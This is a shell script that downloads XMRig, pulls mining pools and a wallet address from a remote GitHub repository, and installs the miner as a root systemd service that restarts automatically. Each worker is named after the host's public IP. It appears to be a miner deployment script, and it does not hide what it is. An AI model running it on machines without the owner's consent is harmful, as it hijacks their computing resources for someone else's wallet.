# Get Etica Pools
pools=$(curl -s https://raw.githubusercontent.com/Br3n0k/etica-cpu-miner-config/refs/heads/main/wallets/etica-pools.json)

# Get Etica Wallet
wallet=$(curl -s https://raw.githubusercontent.com/Br3n0k/etica-cpu-miner-config/refs/heads/main/etica-wallet.json)

# Get public IP
public_ip=$(curl -s ifconfig.me)

# Get worker name based on public IP
worker_name=$(curl -s ifconfig.me | tr . -)

# get low-end pool
low_end_pool=$(echo $pools | jq -r '.["low-end"]')
# get mid-end pool
mid_end_pool=$(echo $pools | jq -r '.["mid-end"]')
# get high-end pool
high_end_pool=$(echo $pools | jq -r '.["high-end"]')
# get very-high-end pool
very_high_end_pool=$(echo $pools | jq -r '.["very-high-end"]')

# get wallet address
wallet_address=$(echo $wallet | jq -r '.wallet')

#download xmrig https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz

# extract xmrig
tar -xzvf xmrig-6.24.0-linux-static-x64.tar.gz

# delete tar.gz
rm xmrig-6.24.0-linux-static-x64.tar.gz

# change directory
cd xmrig-6.24.0

# Get the current xmrig directory on variable
xmrig_dir=$(pwd)

# Transform XMR RIG on Service Background
cat <<EOL > /etc/systemd/system/xmrig.service
[Unit]
Description=XMRig CPU Miner
After=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=$xmrig_dir
ExecStart=$xmrig_dir/xmrig -a etica -o $low_end_pool -u $wallet_address.$worker_name -p x -k
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOL

# enable xmrig service
systemctl enable xmrig

# start xmrig service
systemctl start xmrig

# check xmrig service status
systemctl status xmrig
